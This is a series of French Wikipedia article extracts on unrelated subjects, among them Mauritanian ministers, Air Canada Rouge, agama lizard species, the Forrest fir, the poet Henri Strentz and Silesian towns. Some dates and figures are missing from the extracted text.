Ces œuvres toutes signées ne doivent pas être confondues avec les Collections Daum (vases, lampes, services de verres…) dont il est l’auteur mais qui ne sont pas signées.
Œuvres signées en pâte de verre : Baigneuse 1965 (150 ex, bleue) ; Chevêche, 1968 ; Chouette 1968 (250 ex 18,5cm, vert ocré) ; Tête de Faune 1968 (250 ex); Méditation 1972 ; Icare 1973 ; Rythmes crépusculaires 1974 (100ex, camaïeu de violets) ; Homme arborescent, 1975 (500 ex, verre poli et givré); Vie antérieure 1978 (250 ex, 32cm, bleue) .
Collections Daum.
Il s'agit d'objets décoratifs ayant une fonction d'usage : lampes, vases, verres, cendriers… La cristallerie Daum enrichissait et renouvelait régulièrement sa gamme. Jean-Pierre Demarchi en tant que directeur artistique a été le créateur de plusieurs collections. La politique Daum est que ces créations ne soient pas signées.
Exemples de Collections Daum créées par Jean-Pierre Demarchi : "Arcane" (1970), "Orbe" (1970), "Ariane", "Corolle", "Styx", "Lynx".

</doc>
<doc id="6806277" url="https://fr.wikipedia.org/wiki?curid=6806277" title="Veikko Aleksanteri Heiskanen">
Veikko Aleksanteri Heiskanen

Veikko Aleksanteri Heiskanen, né le à Kangaslampi et décédé le à Helsinki, est un géodésiste finlandais.
Biographie.
Il est surtout célèbre pour son perfectionnement de la théorie de l'isostasie de George Airy et pour ses études du géoïde.

</doc>
<doc id="6806279" url="https://fr.wikipedia.org/wiki?curid=6806279" title="Au paradis des hommes">
Au paradis des hommes

Au paradis des hommes est un long métrage (action/thriller de conspiration) de Cédric Malzieu.
Synopsis.
L'enterrement de vie de garçon de Clément (Julien Courbey) va basculer.

</doc>
<doc id="6806296" url="https://fr.wikipedia.org/wiki?curid=6806296" title="La Hoube">
La Hoube

La Hoube est un village de la commune française de Dabo dans le département de la Moselle.
Géographie.
Établi à 625 mètres d’altitude, c'est le village situé le plus haut du département de la Moselle.
Histoire.
Dépendait du comté de Dabo.
Entre 1790 et 1794, La Hoube est réuni avec Schaeferhof à la commune de Dabo.

</doc>
<doc id="6806297" url="https://fr.wikipedia.org/wiki?curid=6806297" title="Christian Verhaeghe">
Christian Verhaeghe

Christian Verhaeghe, né le , est un dessinateur de bande dessinée belge néerlandophone.
Biographie.
Christian Verhaeghe naît le . Il étudie la mécanique et fait ses débuts en bande dessinée en publiant un court récit de six pages dans le magazine "Jet" des éditions du Lombard en 1993. Puis, il collabore avec le scénariste, coloriste et éditeur Ronny Matton sur les bandes dessinées historiques ', ' et "Ambre Blanc", série qui s'échelonne en "Automne" (1994), "Hiver" (1995), "Printemps" (1998) chez l'éditeur Talent. Ensuite, il travaille pour Soleil Productions, en commençant par reprendre le graphisme de la série "Les Traîne-ténèbres" au quatrième tome "La Forêt hurlante" en succédant à Peter Nielsen en 2002 dont le scénariste de cette série est Brice Tarvel, avec qui il crée la série "Les Contes de Mortepierre" en 2004 chez le même éditeur. Il réalise son rêve de jeunesse en intégrant le Studio Vandersteen en 2013 et contribue à la série "Bob et Bobette" depuis l'album "Le Fantôme tourmenté" en encrant puis en réalisant les décors.

</doc>
<doc id="6806313" url="https://fr.wikipedia.org/wiki?curid=6806313" title="Ismail Ould Bedde Ould Cheikh Sidiya">
Ismail Ould Bedde Ould Cheikh Sidiya

Ismail Ould Bodde Ould Cheikh Sidiya (né le à Boutilimit) est un homme d'État mauritanien. Il est le ministre de l'Habitat, de l'Urbanisme et de l'Aménagement du territoire de Mauritanie de 2011 à 2014, puis Premier Ministre de 2019 à 2020.
Biographie.
Il est titulaire d'un diplôme d'ingénieur de l'École centrale Paris (Promo 1986). Il a effectué toutes ses études supérieures entre Toulouse et Paris en France.
Ismail Ould Bodde Ould Cheikh Sidiya a commencé sa carrière comme Chef du bureau Études et Programmation de la Société nationale industrielle et minière (SNIM), puis Directeur général de la société Compunet. 
Quelque temps après, il occupe le poste de directeur général du bureau d'études ETASCO (mines, énergie, eau, développement urbain, études de faisabilité, communication, méthodes organisationnelles, assistance-conseil) avant de devenir coordinateur du projet ville nouvelle de Boutilimit.
Il est de 2011 à 2014, ministre de l'Habitat, de l'Urbanisme et de l'Aménagement du territoire.
Le , il est désigné Premier ministre de Mauritanie, il quitte ses fonctions le 6 août 2020. 

</doc>
<doc id="6806314" url="https://fr.wikipedia.org/wiki?curid=6806314" title="Association des élus municipaux bretons">
Association des élus municipaux bretons



</doc>
<doc id="6806315" url="https://fr.wikipedia.org/wiki?curid=6806315" title="Congrès de l'Union pour un mouvement populaire de 2004">
Congrès de l'Union pour un mouvement populaire de 2004

Un congrès de l'Union pour un mouvement populaire (UMP) a eu lieu le dans l'objectif d'élire la direction du parti. Ce congrès fait suite à la démission d'Alain Juppé de la présidence du parti pour inéligibilité et à l'intérim de Jean-Claude Gaudin.
Il voit la victoire de l'équipe dirigeante composée de Nicolas Sarkozy (président), de Jean-Claude Gaudin (vice-président) et Pierre Méhaignerie (secrétaire général).
Organisation du congrès.
Localisation.
Le congrès a lieu au Bourget.
Enjeux.
Présidence du parti.
Pour pouvoir se porter candidat, il faut obtenir le soutien d'au moins 3 % des militants UMP à jour de cotisation. Chaque candidat à la présidence forme un « ticket » avec deux autres membres du parti pour les postes de vice-président et de secrétaire général.
Résultats.
Équipe dirigeante.
Nicolas Sarkozy est largement élu président de l'UMP avec plus de 85% des voix

</doc>
<doc id="6806316" url="https://fr.wikipedia.org/wiki?curid=6806316" title="Larz Anderson House">
Larz Anderson House

La Larz Anderson House est un monument situé à Washington, aux États-Unis.
Localisation.
Elle est située au 2118 Massachusetts Avenue (Washington, D.C.), dans le quartier de Dupont Circle.
Histoire.
La Anderson House fut construit, comme résidence d'hiver, pour , un diplomate américain, et son épouse, , auteure et bénévole de la Croix-Rouge américaine.
Après la mort de Larz Anderson en 1937, sa veuve fait don de l'Anderson House et son contenu à la Société des Cincinnati, dont Larz Anderson avait été un membre dévoué pendant plus de quarante ans. La Société a ouvert Anderson House en tant que musée en 1939. L'Anderson House a été inscrite sur le Registre national des lieux historiques en 1971 et a en outre été désignée National Historic Landmark en 1996.
Elle abrite aujourd'hui le siège national de la Société des Cincinnati.

</doc>
<doc id="6806319" url="https://fr.wikipedia.org/wiki?curid=6806319" title="Acalyptophis peronii">
Acalyptophis peronii



</doc>
<doc id="6806322" url="https://fr.wikipedia.org/wiki?curid=6806322" title="Mbugu (peuple)">
Mbugu (peuple)

Les Mbugu sont un peuple d'Afrique de l'Est établi au nord-est de la Tanzanie, dans les monts Usambara. Ils sont proches des Shambala et des Pare.
Ethnonymie.
Selon les sources, on observe quelques variantes : Ma'a, Mbougou, VaMa'a, VaMbugu, Wambugu.
Langues.
Leur langue propre est le mbugu, un cas atypique de langue mixte, bantoue par sa syntaxe et couchitique par son vocabulaire, dont le nombre de locuteurs était estimé à en 1997. Mais la population mbugu dans son ensemble compterait environ personnes, car beaucoup parlent aussi l'asu, le shambala ou le swahili.

</doc>
<doc id="6806324" url="https://fr.wikipedia.org/wiki?curid=6806324" title="Pass It On">
Pass It On

Pass It On est un album du Dave Holland Sextet.
Description.
Pass It On est pour l’instant l’unique album du sextet de Dave Holland réalisé en 2008. Chose rare pour une formation du bassiste, ce sextet contient un piano et la rapproche à ce niveau-là des formations hard bop des années 60. C’est l’opportunité pour Holland de ré exploiter six de ses anciennes compositions dans ce nouveau format qui offre de nouvelles possibilités, tout en ajoutant trois nouveaux titres dont une composition du tromboniste Robin Eubanks. L’album est décrit par la critique comme efficace et comportant toutes les caractéristiques d’un album mené par Dave Holland c’est-à-dire des arrangements précis, de l’improvisation collective et beaucoup d’espaces laissés aux solistes, le tout dans ce format unique entre le quintet et le big band.
Titres.
Sauf indication, tous les titres sont composés par Dave Holland :

</doc>
<doc id="6806328" url="https://fr.wikipedia.org/wiki?curid=6806328" title="Air Canada Rouge">
Air Canada Rouge

Air Canada Rouge est une compagnie aérienne à bas coût canadienne, filiale d'Air Canada, spécialisée dans le voyage d’agrément.
La marque a commencé ses opérations le . Cette initiative s'inscrit dans la transformation du transporteur canadien qui veut devenir plus compétitif face aux nombreuses compagnies à bas coût en opération au Canada et aux États-Unis. Air Canada Rouge est en compétition directe avec Air Transat, qui effectue des vols vers l'Europe et les Caraïbes ou WestJet et Sunwing, qui offrent des vols vers de nombreuses destinations vacances.
La compagnie possède 27 appareils au sein de sa flotte, pour un réseau de 90 liaisons (saisonnières pour la plupart, sur cinq continents) et compte environ quelque à la fin 2017.
Air Canada annonce la suspension des activités d’Air Canada Rouge temporairement le 5 février 2021 jusqu'en août.
Destinations.
Air Canada Rouge assure des vols à partir de l'aéroport international Pearson (Toronto) et l'aéroport international Pierre Elliot Trudeau (Montréal).
De nouvelles destinations seront ajoutées lorsqu’Air Canada commencera à recevoir ses Boeing 787, ce qui va libérer des appareils de la flotte. Dix destinations à l’étranger seront desservies à l’été 2013 (Athènes depuis Toronto et Montréal, les autres seulement depuis l’aéroport Pearson), et 23 pendant l’hiver 2013-2014.
Flotte.
À son lancement, leur flotte était constituée de 4 avions, deux Airbus A319 et deux Boeing 767-300ER, transférés de la flotte d'Air Canada. À la mi-2016, on dénombrait désormais 28 appareils, 16 767, 20 A319 et 5 Airbus A321.
En septembre 2019, la flotte d'Air Canada Rouge est composée de 25 Boeing 767-300ER qui sont utilisés sur les routes transatlantiques, ainsi que 22 Airbus A319-100, 3 Airbus A320-200 et 12 Airbus A321-200 pour les vols à l'intérieur du Canada et les destinations de vacances situées aux États-Unis et dans les Caraïbes. Tous les avions sont aménagés en deux classes : Premium Rouge et Économique. Cette dernière propose des places Préférences avec un confort accru selon la configuration de la cabine.
En mai 2020, durant la pandémie de la COVID-19, Air Canada a annoncé qu'elle retirerait 79 appareils de sa flotte principale ainsi que celle de Rouge. Cela inclut des Boeing 767 et des Embraer 190. La flotte de Rouge a été particulièrement affectée par ces mesures, perdant l'intégralité de ses 25 Boeing 767. Seuls les A320, A319 et A321 restent dans sa flotte.
Le 17 décembre 2024, Air Canada annonce le transfert de toute sa flotte de 737 MAX 8 vers Air Canada Rouge qui devrait être complété d'ici 2028.

</doc>
<doc id="6806335" url="https://fr.wikipedia.org/wiki?curid=6806335" title="Barsbüttel">
Barsbüttel

Barsbüttel est une commune de l'arrondissement de Stormarn, dans le Land de Schleswig-Holstein en Allemagne. Elle est limitrophe de la ville de Hambourg.
Géographie.
La commune se situe à l'est de Hambourg, dans le sud de l'arrondissement de Stormarn.
Depuis 1973 la commune rassemble quatre villages: Barsbüttel, Willinghusen, Stemwarde et Stellau.
Histoire.
Barsbüttel est mentionnée pour la première fois dans un document officiel en 1228 sous le nom de "Bernekesbuttle".

</doc>
<doc id="6806336" url="https://fr.wikipedia.org/wiki?curid=6806336" title="Festival du film de Yokohama">
Festival du film de Yokohama

Le est une cérémonie annuelle de remise de prix se tenant au Japon.
Historique.
Organisée à l'origine à petite échelle par des cinéphiles et des critiques de films, la première édition s'est tenue le .
Années 2000.
2008.
Meilleure photographie : Sam Sadr
Années 2020.
2025.
Organisé le au Kannai Hall de Yokohama

</doc>
<doc id="6806344" url="https://fr.wikipedia.org/wiki?curid=6806344" title="Jean Pullon">
Jean Pullon

Jean Pullon, dit "de Trin" (en latin "Joannes Pullonus", en italien "Giovanni Pullone di Trino"), actif de 1543 à 1561, est un imprimeur lyonnais du .
Biographie.
Jean Pullon dit de Trin est un imprimeur actif à Lyon de 1543 à 1561. Il est originaire de Trino, ville du Piémont (Italie), près de Verceil.
Alors qu'il a longtemps été considéré comme un imprimeur travaillant sur commande (par exemple pour Guillaume Rouillé), Giovanni Ferraris a montré qu'il avait aussi une activité d'éditeur.

</doc>
<doc id="6806350" url="https://fr.wikipedia.org/wiki?curid=6806350" title="Agama savattieri">
Agama savattieri



</doc>
<doc id="6806354" url="https://fr.wikipedia.org/wiki?curid=6806354" title="Agama africana">
Agama africana

Agama africana est une espèce de sauriens de la famille des Agamidae.
Répartition.
Ce lézard se rencontre en Côte d'Ivoire, au Ghana, en Guinée-Bissau, en Guinée, au Liberia, au Mali et en Sierra Leone.
Description.
Dans sa publication de 1844, Hallowell indique que l'holotype présente un corps de de longueur et une queue de , soit une longueur totale de .
Systématique.
Le nom valide complet (avec auteur) de ce taxon est "Agama africana" (Hallowell, 1844).
L'espèce a été initialement classée dans le genre "Tropidolepis" sous le protonyme "Tropidolepis africanus" Hallowell, 1844.
"Agama africana" a pour synonymes :

</doc>
<doc id="6806355" url="https://fr.wikipedia.org/wiki?curid=6806355" title="Brahim Ould M’Barreck Ould Mohamed El Moctar">
Brahim Ould M’Barreck Ould Mohamed El Moctar

Brahim Ould M'Barreck Ould Mohamed El Moctar (en ), né le à Tidjikdja est le Ministre du développement rural de Mauritanie du au , puis Ministre de l'agriculture entre 2014 et 2018.
Parcours.
Il est titulaire d'un diplôme maîtrise en sciences économiques à la Faculté des sciences juridiques, économiques et sociales de Casablanca (Maroc).
Avant sa nomination comme Ministre du développement rural, El Moctar a commencé sa carrière en 1984 comme assistant Chef de service et études à la direction de contrôle de gestion de la SNIM (Société nationale industrielle et minière). 
À partir de 1988, il occupe le poste de Chef de service de la comptabilité analytique à la direction du contrôle de gestion de la SNIM. En 1995 il devient Responsable marketing à la direction de la SNIM à Paris, avant d'occuper le poste de directeur de succursale de la SNIM à Paris en 2007.
Il est ministre du développement rural du au , puis ministre de l'Agriculture du gouvernement de Yahya Ould Hademine entre 2014 et 2018.
Il est marié et père de quatre enfants. 

</doc>
<doc id="6806357" url="https://fr.wikipedia.org/wiki?curid=6806357" title="Banque Nationale de Mauritanie">
Banque Nationale de Mauritanie



</doc>
<doc id="6806358" url="https://fr.wikipedia.org/wiki?curid=6806358" title="RED (album de Ne-Yo)">
RED (album de Ne-Yo)

RED est le cinquième album studio de Ne-Yo, sorti le .
L'opus contient des chansons de différents styles musicaux, combinant RnB, pop et dance-pop. Ne-Yo y a réuni des collaborateurs de longue date comme StarGate mais également de nouveaux comme Harmony Samuels, No I.D. ou encore The Underdogs.
L'album s'est classé au Top R&amp;B/Hip-Hop Albums, au Top Digital Albums et au Billboard 200.

</doc>
<doc id="6806361" url="https://fr.wikipedia.org/wiki?curid=6806361" title="Banque Solfea">
Banque Solfea

La Banque Solfea était une filiale de Engie et de BNP Paribas Personal Finance spécialisée dans la conception et le montage de financements d’équipements, afin d’améliorer l’efficacité énergétique du logement.
Le BNP PARIBAS PERSONAL FINANCE a repris les activités de la banque SOLFEA.
Histoire.
La Banque Petrofigaz, ancien nom de la Banque Solfea a été créée en 1956.
En 1996, la Banque Petrofigaz concentre son activité sur le financement d’installations au gaz naturel dans le secteur résidentiel public et privé autour de prêts à taux aidé par Gaz de France. 
La banque change de nom en 2004 et devient Banque Solfea, et élargit alors ses prêts pour les destiner au financement de tous les travaux permettant l'amélioration de l'habitat.
Différents événements de marché impactent fortement le métier de la Banque :
L'activité de la Banque Solfea évolue pour passer du chauffage au gaz au confort de vie des particuliers à l’éco-efficacité dans le logement. 
En 2010, la Banque Solfea connaît une croissance de 33 % de la production de crédit.
Dirigeants.
Les dirigeants sont actuellement Jean-Baptiste DEVALLAND (Directeur Général) et Valérie Ruiz-Domingo (directeur général délégué) avec Olivier Feist comme président du conseil d'administration.
Actionnariat.
Les actionnaires principaux sont Engie à 55 % et BNP Paribas Personal Finance à 45 %.
Chiffres d'affaires 2011 : 
Résultat 2011 : 
Activités.
La Banque Solfea propose des prêts dédiés à la rénovation du logement (crédit affecté).
Elle accompagne la démarche ECO Artisan, qui consiste à proposer à des particuliers souhaitant réaliser des travaux de performance énergétique, le service d’artisans qui possèdent une compétence globale en matière d’évaluation thermique et de conseil sur l’efficacité énergétique et la réalisation des travaux.
La Banque Solfea est aussi signataire de la charte permettant la mise en place l’éco-prêt à taux zéro, qui permet de financer la rénovation énergétique des logements, et ainsi de réduire les émissions de gaz à effet de serre.
Début 2011, la Banque Solfea a noué un partenariat avec la CAPEB (Confédération de l'artisanat et des petites entreprises du bâtiment), marquant une volonté commune de défendre une croissance verte et d’apporter aux artisans et aux particuliers un éventail d’outils et d’informations.

</doc>
<doc id="6806363" url="https://fr.wikipedia.org/wiki?curid=6806363" title="Famille de Bonne">
Famille de Bonne

La famille de Bonne est un lignage noble appartenant à l'ancienne noblesse chevaleresque du Languedoc venu s'installer, selon la tradition dans le Dauphiné, au . Sa filiation remonterait à cette période et elle s'éteint au .
Histoire.
D'après le Père Anselme de Sainte-Marie, le premier membre connu de cette famille est Bosonet de Bonne qui donna ce qu'il possédait sur les terres de Champsaur, en démembrement, au Dauphin Guigues VII, en 1250. Tous les premiers Bonne rendirent hommage aux Dauphins.
Les différentes branches de la famille s'éteignent au .
En 1600, Roger de Bonne, de la branche d'Auriac, acquiert les terres et titre de la vicomté de Tallard, sur Charles-Henri de Clermont.
Le titre de duc de Lesdiguières et pair de France, a été créé en 1611 par Louis XIII en faveur de François de Bonne (1543-1626) et de Charles de Créquy, prince de Poix, son gendre.
En 1719, les terres du duché seront acquises par Camille d'Hostun.
Branches.
Gustave de Rivoire de La Bâtie relevait trois branches principales :
Les suivantes sont également mentionnées :

</doc>
<doc id="6806370" url="https://fr.wikipedia.org/wiki?curid=6806370" title="Dare2 Records">
Dare2 Records

Dare2 Records est un label discographique britannique, basé en Angleterre, fondé en 2005 par le bassiste Dave Holland.
Histoire.
En 2005, Dave Holland conclut un partenariat avec Sunnyside Records pour distribuer ses futurs enregistrements aux États-Unis sous son label Dare2 Records. Universal Music Jazz France distribuera ces enregistrements en dehors des États-Unis. Le premier disque sort le 22 février et s'intitule "".
Dans une interview en 2021, Holland explique, concernant la création du label : . Cette même année, Dare2 conclut un partenariat de distribution avec Edition Records.

</doc>
<doc id="6806372" url="https://fr.wikipedia.org/wiki?curid=6806372" title="Agama boensis">
Agama boensis

Agama boensis est une espèce de sauriens de la famille des Agamidae.
Répartition.
Cette espèce se rencontre au Sénégal, au Mali, en Guinée-Bissau et en Guinée.
Étymologie.
Son nom d'espèce, composé de "bo[e]" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, Boe.

</doc>
<doc id="6806374" url="https://fr.wikipedia.org/wiki?curid=6806374" title="Arrondissement d’Issoire">
Arrondissement d’Issoire



</doc>
<doc id="6806375" url="https://fr.wikipedia.org/wiki?curid=6806375" title="Jelcz-Laskowice">
Jelcz-Laskowice

Jelcz-Laskowice est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Jelcz-Laskowice, dans le powiat d'Oława.

</doc>
<doc id="6806377" url="https://fr.wikipedia.org/wiki?curid=6806377" title="Abderrazak Hammami">
Abderrazak Hammami

Abderrazak Hammami (), né le à Kairouan et mort le à Tunis, est un réalisateur et acteur tunisien.
Biographie.
Il poursuit ses études à Troyes en France avant de décrocher son diplôme de théâtre à l'École supérieure d'art dramatique de Strasbourg.
Il devient en 1965 l'un des premiers réalisateurs de la Radiodiffusion-télévision tunisienne. On lui doit de nombreuses émissions et feuilletons célèbres, dont "Ommi Traki", dont il fait un film en 1973. Il joue par ailleurs dans des œuvres dramatiques tunisiennes et françaises.
En 2012, quelques mois avant sa mort, son nom est donné au studio 400 de la maison de la télévision tunisienne.

</doc>
<doc id="6806386" url="https://fr.wikipedia.org/wiki?curid=6806386" title="Parti de la nouvelle frontière">
Parti de la nouvelle frontière



</doc>
<doc id="6806390" url="https://fr.wikipedia.org/wiki?curid=6806390" title="Yahya Ould Hademine">
Yahya Ould Hademine

Yahya Ould Hademine (en arabe : يحيى ولد حدأمين), né le à Timbedra, est un homme d'État mauritanien issu de la tribu de Laghlal, il fut Premier ministre de Mauritanie du au .
Biographie.
Yahya Ould Hademine est titulaire d'un diplôme d’ingénieur en génie métallurgique de l'École polytechnique de Montréal obtenu en 1979. 
Il commence sa carrière comme chef de service exploitation aciérie de la Société nationale industrielle et minière (SNIM) en 1979. 
Il occupe ensuite le poste de Chef de service achats de la SNIM de 1985 à 1988 puis le poste de Directeur général de la SAFA (une filiale de la SNIM) entre 1989 et 2003, et devient le Directeur général de l’ATTM, une société d'assainissement, de travaux, de transport et de maintenance, de 2003 à 2010.
En 2010, il est nommé ministre de l’Équipement et des Transports avant d'être nommé Premier ministre en fonction qu'il occupa jusqu'au 30 octobre 2018.
En mars 2021, Yahya Ould Hademine est reconnu coupable de corruption et inculpé le 12 mars 2021.
En 2022, le pôle anti-corruption du Parquet de la République de Nouakchott-Ouest a annoncé, mercredi 1er juin (2022) avoir requis le renvoi devant la juridiction compétente les personnalités accusées de corruption dans le cadre du dossier de la corruption n° 001/2021, dossier dont fait partie l'ancien Premier ministre Yahya Ould Hademine.
Liens externes.
 

</doc>
<doc id="6806392" url="https://fr.wikipedia.org/wiki?curid=6806392" title="Abies forrestii">
Abies forrestii

Abies forrestii, le Sapin de Forrest, est une espèce de plantes appartenant à la famille des "Pinaceae". C'est un sapin endémique des régions montagneuses de Chine occidentale (au nord-ouest du Yunnan, au sud-ouest du Sichuan et à l'est du Tibet).
Étymologie et histoire de la nomenclature.
Le nom de genre "Abies", créé par Philip Miller en 1754, est dérivé du latin "abies, etis" « sapin ».
L’épithète spécifique "forrestii" est dédié au botaniste écossais George Forrest qui a découvert cette espèce au Yunnan.
George Forrest (1873-1932) est parti en 1904 pour collecter des plantes rares au Yunnan. Il collecta une nouvelle espèce de sapin en août 1910 sur , selon la planche d’herbier ci-contre.
Des graines envoyées au Royaume-Uni par Forrest, poussa un sapin au feuillage attrayant qui laissa perplexe les jardiniers botanistes du Jardin botanique royal d'Édimbourg. Le sapin "Abies delavayi", collecté originellement en 1884, près de Dali par le père Delavay, est proche mais n’est pas identique à l’arbre issu de graines venant de la montagne de Lijiang collecté par Forrest. En mars 1919, le botaniste britannique Charles Coltman-Rogers dans The Gardeners' Chronicle ser. 3 65: 150 le nomme "Abies forrestii".
Le nom vernaculaire chinois est 川滇冷杉 Chuāndiān lěngshān.
Synonymes.
Selon The Plant List, les synonymes sont :
Description.
Le sapin de Forrest est à croissance lente. Il mesure de 20 à de hauteur avec un tronc de dans son habitat naturel. Son tronc est gris foncé. Le port est un cône étroit.
Les feuilles (aiguilles) sont ascendantes sur la face supérieure des rameaux, disposées de manière pectinée en 2 ensembles latéraux sur la face inférieure ; elles sont droites, plates ou avec la marge parfois enroulée en dedans, de couleur verte et brillantes, de 2-3 voire de long sur . Les lignes de stomates forment 2 bandes blanches très visibles sur la face inférieure, l’apex est généralement émarginé. 
Les cônes mâles de de long, sont pourpres puis jaunes, sous le rameau. La pollinisation a lieu en mai.
Les cônes femelles sont sessiles, dressés, de couleur brun violacé ou brun noir à maturité, cylindriques, de de long sur selon Flora of China (ou sur pour d’autres). Les écailles portant les graines sont flabellées (en forme d’éventail) ou trapézoïdales, à marge auriculée latéralement. Les bractées sont cunéiformes-obovales, à marge distale largement arrondie, à apex avec cuspide (longue pointe) déployée, droite ou recourbée de .
Les graines font environ , avec aile brun clair ou brun rouge, largement cunéiforme.
Taxons infraspécifiques.
Selon Farjon et The Plant List, il y a 3 variétés:
Distribution et habitats.
Le sapin de Forrest est une espèce endémique du sud-ouest de la Chine dans les provinces du SO Sichuan, E Tibet, NO Yunnan.
Il pousse en montagnes entre et .
Utilisations.
Le bois du pin de Forrest est utilisé pour la construction et l'écorce pour extraire du tanin.

</doc>
<doc id="6806394" url="https://fr.wikipedia.org/wiki?curid=6806394" title="Brzeg Dolny">
Brzeg Dolny

Brzeg Dolny (API : , "Dyhernfurth" en allemand), est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Brzeg Dolny, dans le powiat de Wołów.

</doc>
<doc id="6806396" url="https://fr.wikipedia.org/wiki?curid=6806396" title="Liste des titres musicaux numéro un en Allemagne en 2000">
Liste des titres musicaux numéro un en Allemagne en 2000

Cette page liste les titres numéro un dans les meilleures ventes de disques en Allemagne pour l'année 2000 selon Media Control Charts.
Les classements sont issus des 100 meilleures ventes de singles et des 100 meilleures ventes d'albums. Ils se déroulent du vendredi au jeudi, et sont publiés le mardi par l'industrie musicale allemande.

</doc>
<doc id="6806398" url="https://fr.wikipedia.org/wiki?curid=6806398" title="Henri Strentz">
Henri Strentz

Henri Strentz, né le à Paris et mort le à Paris, est un poète, romancier, homme de théâtre et historien de la littérature française.
Biographie.
Henri Strentz naît à Paris, d’un père boulanger d’origine alsacienne et d’une mère de la région de Melun.
Quelques éléments de sa vie sont connus par deux ouvrages d’écrivains ayant été ses amis :
ainsi que par deux de ses ouvrages "Le Théâtre de Hans Pipp" et "L’Homme aux mirages", au travers de ses personnages Hans Pipp, son alter ego, et son grand-oncle Frumence qui a marqué son enfance.
Enfant, il passe ses vacances chez des parents à Héricy-sur-Seine où il a l’occasion d’approcher Stéphane Mallarmé.
Il rencontre également dans la maison où habitent ses parents au coin de la rue Mandar et de la rue Montorgueil, le jeune poète Saint-Pol-Roux de dix ans son ainé dont il restera l’ami.
Après ses études, influencé notamment par Gérard de Nerval, Victor Hugo, Paul Verlaine, Stéphane Mallarmé et Saint-Pol-Roux, il commence à écrire et publie dans la revue "La Plume" de Léon Deschamps, où il se lie avec Guillaume Apollinaire, ainsi que dans la revue "Pan" dirigée par Jean Clary. Il collabore également en 1911-1912 à la revue "Les Tablettes" d'Albert Fleury.
Ses premiers poèmes seront rassemblés dans "Premières Odes" en 1895, ouvrage non édité, puis dans "Le Regard d’Ambre" en 1906 et "dans Images simples et ferventes" en 1908.
Installé à Belleville, il côtoie de nombreux artistes du groupe dit « "ceux de Belleville" », animé par Jean Dolent. Parmi eux ses amis Fagus (pseudonyme de Georges Faillet) et Paul-Napoléon Roinard, qu’il ne cessera de défendre et de faire connaître par des écrits et des conférences.
En 1910, il fait partie d'un mouvement poétique post-symboliste, le "Dynamisme" avec Philéas Lebesgue et Alphonse-Marius Gossez, avec qui il publie en 1911 "Essai d’expansion d’une esthétique", textes de leurs trois conférences à Rouen, celle de Strentz portant sur son ami Roinard.
Nervalien reconnu, il fait paraître en 1911 dans la collection "Portraits d’hier" son essai sur Gérard de Nerval, auquel il avait déjà consacré un poème dans "Premières Odes".
Ensuite il dirige avec Marcel Millet et René Morand "Les Horizons", revue qu’en 1913 il abandonne avec René Morand, à la suite de divergences, pour fonder "Le Gay Scavoir", qui fusionnera plus tard avec "L’Ile Sonnante", jusqu’en 1914, date à laquelle ces publications ne paraîtront plus.
En 1913, il publie "Les Amants sur la rive", roman très marqué par le symbolisme.
Après la Guerre de 1914-1918, il utilise son personnage Hans Pipp (pseudonyme sous lequel il a déjà publié sa pièce "Le Docteur Monstre" dans "Pan" en 1910) et propose avec "Le Théâtre de Hans Pipp" en 1922 et "Le Nouveau Théâtre de Hans Pipp" en 1923, des pièces en un acte riches en indications scéniques, pleines de poésie et de fantaisie, avec des situations et des personnages comme son Pierrot, faisant référence au mime Debureau, très inspirés du théâtre de tréteau.
Parmi ces pièces "L’Enfant de la Lune" et "La Ligne droite est morte" sont mises en scène en 1922 et 1923 dans le cadre du Laboratoire Art et Action d’Édouard Autant et Louise Lara.
Il publie en 1925 un essai critique sur Paul Verlaine, suivi en 1927 d’un essai sur Arthur Rimbaud.
En 1932, son recueil "Complaintes pour les innocents" sort en reprenant avec des inédits quelques poèmes déjà parus, comme "Complaintes pour les tristes ménages" en 1917 au "Mercure de France".
En 1932, son essai "Gérard de Nerval" est réédité dans une version augmentée.
En 1935, il publie "Le Roi du violon", un recueil de nouvelles et revient au théâtre de bibliothèque avec "Floria de Florence", drame en cinq actes, aux dialogues très denses, assez différent de l’esprit du "Théâtre de Hans Pipp".
Son roman "L’Homme aux mirages", publié en 1935, conte son enfance et de sa jeunesse à Paris avec son grand-oncle Frumence (en fait un personnage de fiction mais inspiré à la fois de son grand-père et du plus jeune frère de celui-ci). La vie de ce personnage truculent est l’occasion d’évoquer la Révolution de 1848, le Siège de Paris et la Commune de 1870 et de faire ressortir l’esprit républicain dans lequel sa famille l’a élevé.
Ses "Premières odes" seront enfin éditées en 1938.
Entre 1934 et 1938 un certain nombre de contes et nouvelles sont publiés dans "Annales Africaines", revue dans laquelle écrit son ami Robert Randau, et entre 1938 et 1942 dans "Visages du Monde", magazine dirigé par Georges Pillement.
Henri Strentz meurt subitement à 70 ans le . Il est enterré au cimetière du Père-Lachaise ( division) à Paris.
 (Maurice-Pierre Boyé – 1974)

</doc>
<doc id="6806400" url="https://fr.wikipedia.org/wiki?curid=6806400" title="Alexander (cratère)">
Alexander (cratère)



</doc>
<doc id="6806403" url="https://fr.wikipedia.org/wiki?curid=6806403" title="Strzelin">
Strzelin

Strzelin (Strehlen jusqu'en 1946) est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Strzelin et du powiat de Strzelin.
Situation géographique.
Strzelin est arrosée par l'Ohle et se trouve au pied des monts de Strehlen ("Wzgórza Strzelinskie"), à au sud de Wrocław. 
Histoire.
Strehlen reçoit en 1293 sa charte urbaine du duc Boleslas Ier le Sévère.
Depuis le , Strehlen et ses environs comptaient une forte minorité ethnique de colons protestants de langue tchèque, venus de Bohême. Le village de Gęsiniec (autrefois "Hussinetz") était le principal foyer de ces disciples de Jan Hus. 
Vers 1900, Strehlen possédait deux temples protestants, un temple vieux-luthérien et une église catholique, une synagogue, un tribunal d'instance et un lycée. Jusqu'en 1945, c'était le chef-lieu de l'arrondissement de Strehlen, dans le district de Breslau de la province allemande de Basse-Silésie.
